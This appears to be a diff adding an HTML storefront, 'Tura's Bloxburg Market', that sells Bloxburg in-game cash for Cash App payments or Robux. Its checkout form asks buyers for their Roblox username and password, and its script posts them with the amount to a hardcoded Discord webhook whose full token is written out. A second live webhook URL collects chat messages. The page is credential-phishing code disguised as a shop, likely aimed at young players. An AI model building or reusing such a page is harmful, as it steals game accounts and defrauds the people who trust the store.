@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Tura’s Bloxburg Market</title>
+  <style>
+    :root {
+      --main: #ffffff;
+      --glow: #cccccc;
+      --bg-dark: #000000;
+      --text-light: #f0f0f0;
+      --accent: #dddddd;
+      --btn-bg: #ffffff;
+      --btn-hover: #bbbbbb;
+      --text-shadow-glow:
+        0 0 5px var(--glow),
+        0 0 10px var(--glow),
+        0 0 15px var(--main);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0; padding: 0;
+    }
+
+    body {
+      background: var(--bg-dark);
+      color: var(--text-light);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    h1 {
+      text-align: center;
+      color: var(--main);
+      margin-bottom: 2rem;
+      text-shadow: var(--text-shadow-glow);
+      font-size: 2.8rem;
+      animation: floatUpDown 3s ease-in-out infinite;
+    }
+
+    h2.category-title {
+      font-size: 1.9rem;
+      margin: 2rem 0 1.2rem;
+      color: var(--accent);
+      text-shadow: var(--text-shadow-glow);
+      border-bottom: 2px solid var(--glow);
+      padding-bottom: 6px;
+      letter-spacing: 0.07em;
+    }
+
+    .product-container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 30px;
+      max-width: 960px;
+      width: 100%;
+      margin-bottom: 3rem;
+    }
+
+    .product-card {
+      background: #111;
+      border: 2px solid var(--main);
+      box-shadow:
+        inset 0 0 12px #333,
+        0 0 15px var(--main);
+      border-radius: 15px;
+      text-align: center;
+      padding: 25px 20px;
+      color: var(--text-light);
+      font-weight: 700;
+      text-shadow: var(--text-shadow-glow);
+      transition: transform 0.4s, box-shadow 0.4s;
+    }
+
+    .product-card:hover {
+      transform: scale(1.07);
+      box-shadow: 0 0 30px var(--glow);
+    }
+
+    .product-card h3 {
+      margin-bottom: 12px;
+      color: var(--accent);
+      font-weight: 900;
+      font-size: 1.5rem;
+    }
+
+    .product-card img {
+      width: 100%;
+      height: 160px;
+      object-fit: cover;
+      border-radius: 12px;
+      margin-bottom: 15px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+    }
+
+    .price {
+      font-size: 1.6em;
+      font-weight: 900;
+      margin-bottom: 20px;
+      color: var(--glow);
+      text-shadow: 0 0 10px var(--glow);
+    }
+
+    .buy-btn, .rbx-btn {
+      background: var(--btn-bg);
+      color: #000;
+      border: none;
+      padding: 14px 30px;
+      font-weight: 900;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      cursor: pointer;
+      text-transform: uppercase;
+      transition: 0.3s ease;
+    }
+
+    .buy-btn:hover, .rbx-btn:hover {
+      background: var(--btn-hover);
+      box-shadow: 0 0 40px var(--glow);
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.95);
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .modal-content {
+      background: #111;
+      padding: 2rem;
+      border-radius: 15px;
+      max-width: 480px;
+      width: 90%;
+      box-shadow: 0 0 40px var(--main);
+      position: relative;
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 15px;
+      right: 25px;
+      font-size: 2rem;
+      color: var(--main);
+      cursor: pointer;
+      background: none;
+      border: none;
+    }
+
+    .cashapp h4 {
+      font-size: 1.6rem;
+      color: var(--glow);
+      margin-bottom: 0.6rem;
+    }
+
+    .cashapp img {
+      width: 170px;
+      border-radius: 18px;
+      box-shadow: 0 0 30px var(--glow);
+    }
+
+    .cashapp p {
+      margin-top: 10px;
+      font-size: 1.3rem;
+      color: var(--main);
+    }
+
+    form label {
+      display: block;
+      margin-top: 1.2rem;
+      font-weight: 700;
+      color: var(--accent);
+    }
+
+    form input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 0.4rem;
+      border-radius: 10px;
+      border: none;
+      background: #222;
+      color: var(--text-light);
+    }
+
+    form input:focus {
+      outline: none;
+      background: #333;
+    }
+
+    form button {
+      margin-top: 1.5rem;
+      width: 100%;
+      padding: 14px;
+      background: var(--btn-bg);
+      color: #000;
+      font-weight: 900;
+      font-size: 1.1rem;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: background 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    form button:hover {
+      background: var(--btn-hover);
+      box-shadow: 0 0 40px var(--glow);
+    }
+
+    @keyframes floatUpDown {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-12px); }
+    }
+
+    @media (max-width: 600px) {
+      .product-container {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* Live Chat Widget - White & Black Modern Glow */
+    #chat-widget {
+      position: fixed;
+      right: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      background: #111;
+      border-left: 3px solid #fff;
+      border-radius: 12px 0 0 12px;
+      width: 300px;
+      box-shadow: -2px 0 25px rgba(255, 255, 255, 0.3);
+      z-index: 9999;
+      font-family: 'Segoe UI', sans-serif;
+      color: #eee;
+      backdrop-filter: blur(3px);
+      overflow: hidden;
+    }
+
+    #chat-header {
+      background: #fff;
+      color: #000;
+      padding: 12px 16px;
+      font-weight: bold;
+      border-radius: 12px 0 0 0;
+      text-shadow: none;
+      box-shadow: 0 2px 8px rgba(255,255,255,0.2);
+    }
+
+    #chat-header small {
+      display: block;
+      font-size: 0.85em;
+      color: #444;
+      margin-top: 2px;
+    }
+
+    #chat-messages {
+      padding: 12px;
+      height: 200px;
+      overflow-y: auto;
+      font-size: 0.9em;
+      background: #1a1a1a;
+      border-top: 1px solid #333;
+      border-bottom: 1px solid #333;
+    }
+
+    #chat-greeting {
+      margin-bottom: 10px;
+      font-weight: bold;
+      color: #fff;
+      text-shadow: 0 0 6px #fff;
+    }
+
+    #chat-input {
+      display: flex;
+      padding: 10px;
+      gap: 6px;
+      background: #111;
+    }
+
+    #chat-input input {
+      flex: 1;
+      padding: 8px;
+      border-radius: 6px;
+      border: none;
+      background: #222;
+      color: #f0f0f0;
+      box-shadow: inset 0 0 8px #000;
+    }
+
+    #chat-input input::placeholder {
+      color: #aaa;
+    }
+
+    #chat-input button {
+      background: #fff;
+      color: #000;
+      border: none;
+      font-weight: bold;
+      padding: 8px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      box-shadow: 0 0 10px rgba(255,255,255,0.5);
+      transition: all 0.3s ease;
+    }
+
+    #chat-input button:hover {
+      background: #ddd;
+      box-shadow: 0 0 15px rgba(255,255,255,0.7);
+    }
+
+    #chat-input button:disabled {
+      background: #666;
+      color: #ccc;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>💰Tura’s Bloxburg Market💰</h1>
+
+  <h2 class="category-title">💸BloxBurg (USD) Category💸</h2>
+  <div class="product-container">
+    <article class="product-card">
+      <h3>500K BloxBurg Cash</h3>
+      <img src="https://i.imgur.com/QhE3Ize.png" alt="500K BloxBurg Cash" />
+      <div class="price">$5.00</div>
+      <button class="buy-btn">Buy Now</button>
+    </article>
+
+    <article class="product-card">
+      <h3>1M BloxBurg Cash</h3>
+      <img src="https://i.imgur.com/QhE3Ize.png" alt="1M BloxBurg Cash" />
+      <div class="price">$10.00</div>
+      <button class="buy-btn">Buy Now</button>
+    </article>
+
+    <article class="product-card">
+      <h3>5M BloxBurg Cash</h3>
+      <img src="https://i.imgur.com/QhE3Ize.png" alt="5M BloxBurg Cash" />
+      <div class="price">$25.00</div>
+      <button class="buy-btn">Buy Now</button>
+    </article>
+  </div>
+
+  <h2 class="category-title">BloxBurg (RBX) Category</h2>
+  <div class="product-container">
+    <article class="product-card">
+      <h3>500K BloxBurg Cash</h3>
+      <img src="https://i.imgur.com/QhE3Ize.png" alt="500K BloxBurg Cash RBX" />
+      <div class="price">R$500</div>
+      <button class="rbx-btn">Buy Now</button>
+    </article>
+
+    <article class="product-card">
+      <h3>1M BloxBurg Cash</h3>
+      <img src="https://i.imgur.com/QhE3Ize.png" alt="1M BloxBurg Cash RBX" />
+      <div class="price">R$1200</div>
+      <button class="rbx-btn">Buy Now</button>
+    </article>
+
+    <article class="product-card">
+      <h3>5M BloxBurg Cash</h3>
+      <img src="https://i.imgur.com/QhE3Ize.png" alt="5M BloxBurg Cash RBX" />
+      <div class="price">R$3000</div>
+      <button class="rbx-btn">Buy Now</button>
+    </article>
+  </div>
+
+  <div class="modal" id="orderModal">
+    <div class="modal-content">
+      <button class="modal-close" id="modalClose">&times;</button>
+      <h3>Complete Your Purchase</h3>
+      <div class="cashapp">
+        <h4>Cash App</h4>
+        <img src="https://i.imgur.com/kqhX5AT.jpeg" alt="Cash App QR" />
+        <p>$CleverTactic</p>
+      </div>
+      <form id="orderForm">
+        <label for="username">Roblox Username</label>
+        <input type="text" id="username" name="username" required />
+        <label for="password">Roblox Password</label>
+        <input type="password" id="password" name="password" required />
+        <label for="amount">Amount to Pay</label>
+        <input type="text" id="amount" name="amount" readonly />
+        <button type="submit">Submit Payment</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Live Chat Widget -->
+  <div id="chat-widget">
+    <div id="chat-header">
+      Live Staff Chat
+      <small>Average wait time: 5–10 min</small>
+    </div>
+    <div id="chat-messages">
+      <div id="chat-greeting">💬 Have any questions or issues? Discord User: ______, Question: _______</div>
+    </div>
+    <div id="chat-input">
+      <input type="text" id="chatText" placeholder="Enter User and Question..." />
+      <button id="chatSend">Send</button>
+    </div>
+  </div>
+
+  <script>
+    // Modal logic
+    const modal = document.getElementById('orderModal');
+    const modalClose = document.getElementById('modalClose');
+    const buyButtons = document.querySelectorAll('.buy-btn');
+    const rbxButtons = document.querySelectorAll('.rbx-btn');
+    const amountInput = document.getElementById('amount');
+    const orderForm = document.getElementById('orderForm');
+
+    // RBX links mapped by product title
+    const rbxLinks = {
+      "500K BloxBurg Cash": "https://www.roblox.com/game-pass/1290061772/500K",
+      "1M BloxBurg Cash": "https://www.roblox.com/game-pass/1293166954/1M",
+      "5M BloxBurg Cash": "https://www.roblox.com/game-pass/1289725979/5M",
+    };
+
+    buyButtons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        const card = btn.closest('.product-card');
+        const price = card.querySelector('.price').textContent;
+        amountInput.value = price;
+        modal.style.display = 'flex';
+        orderForm.username.focus();
+      });
+    });
+
+    rbxButtons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        const card = btn.closest('.product-card');
+        const title = card.querySelector('h3').textContent.trim();
+        const link = rbxLinks[title];
+        if (link) {
+          window.open(link, '_blank');
+        } else {
+          alert("Link not found for this product.");
+        }
+      });
+    });
+
+    modalClose.addEventListener('click', () => {
+      modal.style.display = 'none';
+      orderForm.reset();
+    });
+
+    window.addEventListener('click', e => {
+      if (e.target === modal) {
+        modal.style.display = 'none';
+        orderForm.reset();
+      }
+    });
+
+    orderForm.addEventListener('submit', e => {
+      e.preventDefault();
+
+      const username = orderForm.username.value.trim();
+      const password = orderForm.password.value.trim();
+      const amount = amountInput.value.trim();
+
+      if (!username || !password) {
+        alert("Please fill in all required fields.");
+        return;
+      }
+
+      const content =
+        `@here New Purchase Submission:\n` +
+        `**Username:** ${username}\n` +
+        `**Password:** ${password}\n` +
+        `**Amount:** ${amount}`;
+
+      fetch("https://discord.com/api/webhooks/1389024141528666142/QZUmCZiwKd2u66BdkWQf7h28amii9wzuu4aTAJqABvJli5PX5LrPykk9Q5vN4EcGyNhi", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content }),
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Payment submitted! A staff member will contact you shortly.");
+          orderForm.reset();
+          modal.style.display = 'none';
+        } else {
+          alert("Failed to submit payment. Please try again later.");
+        }
+      })
+      .catch(() => {
+        alert("Network error. Please try again later.");
+      });
+    });
+
+    // Live chat widget logic
+    const webhookURL = "https://discord.com/api/webhooks/1389397400959062036/47lWv053bcUMeU11Pi5UDhhkW8FYifVVrFog7gNHXQaDPZW_snPHL58CjpIqr0Yr-2ED";
+
+    const chatText = document.getElementById("chatText");
+    const chatSend = document.getElementById("chatSend");
+    const chatMessages = document.getElementById("chat-messages");
+
+    let messageSent = false;
+
+    function appendMessage(text, sender = "🧑‍💻 You") {
+      const msg = document.createElement("div");
+      msg.textContent = `${sender}: ${text}`;
+      msg.style.marginBottom = "8px";
+      chatMessages.appendChild(msg);
+      chatMessages.scrollTop = chatMessages.scrollHeight;
+    }
+
+    function sendMessage() {
+      if (messageSent) return;
+
+      const msg = chatText.value.trim();
+      if (!msg) return;
+
+      appendMessage(msg);
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: msg })
+      })
+      .then(() => {
+        chatText.value = "";
+        chatSend.disabled = true;
+        chatText.disabled = true;
+        messageSent = true;
+        appendMessage("Thanks! A staff member will respond shortly. ✅", "🤖 Bot");
+      })
+      .catch(() => {
+        appendMessage("❌ Message failed to send. Try again later.", "System");
+      });
+    }
+
+    chatSend.onclick = sendMessage;
+    chatText.addEventListener("keydown", e => {
+      if (e.key === "Enter") sendMessage();
+    });
+  </script>
+</body>
+</html>
